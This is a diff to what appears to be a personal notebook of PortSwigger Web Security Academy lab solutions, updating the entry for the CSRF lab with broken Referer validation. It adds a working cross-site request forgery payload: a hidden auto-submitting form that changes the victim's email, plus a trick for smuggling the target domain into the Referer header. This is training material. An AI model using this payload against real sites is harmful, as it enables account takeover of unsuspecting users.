@@ -211,13 +211,18 @@ https://portswigger.net/web-security/csrf/lab-referer-validation-depends-on-head
 ## CSRF with broken Referer validation
 https://portswigger.net/web-security/csrf/lab-referer-validation-broken
 
-```html
-<meta name="referrer" content="never">
+Can check [here](https://gist.github.com/hsleonis/0dd421c57eeae61bcd2c0dbe3b887c06) for more on referrer states. But the idea is to send the uri in the referrer
 
+Make the endpoint be `//0a77000f04c15079c0e41fd600040018.web-security-academy.net`
+
+This `/a?0a77000f04c15079c0e41fd600040018.web-security-academy.net/my-account/` works on testing, but looking at the exploit server logs, the server cannot access it (404) due to adding a `/` at the end
+
+```html
+<meta name="referrer" content="unsafe-url">
 <div id="account-content">
-    <form class="login-form" name="change-email-form" action="https://0a7000900402532ec00dad9b00ab007c.web-security-academy.net/my-account/change-email" method="POST">
+    <form class="login-form"action="https://0a77000f04c15079c0e41fd600040018.web-security-academy.net/my-account/change-email" method="POST">
         <label>Email</label>
-        <input type="hidden" name="email" value="pwned@evil-user.net" />
+        <input type="hidden" name="email" value="pwn@evil-user.net" />
         <button class="button" type="submit"> Update email </button>
     </form>
     <script>
